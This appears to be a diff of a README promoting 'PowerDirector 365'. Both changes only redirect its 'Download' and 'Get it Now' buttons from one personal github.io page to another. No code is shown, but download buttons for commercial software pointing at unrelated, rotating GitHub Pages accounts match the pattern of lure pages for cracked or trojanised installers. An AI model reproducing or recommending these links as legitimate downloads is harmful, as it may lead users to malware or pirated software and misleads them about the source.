@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://a4-glent.github.io/.github/powerDirector365">
+  <a href="https://poxmell.github.io/.github/powerDirector365">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download PowerDirector 365"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The AI toolset breadth is PowerDirector's competitive differentiator versus Fina
 
 <p align="center">
 
-[![Get it Now PowerDirector 365](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/powerDirector365)
+[![Get it Now PowerDirector 365](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://poxmell.github.io/.github/powerDirector365)
 
 </p>
 
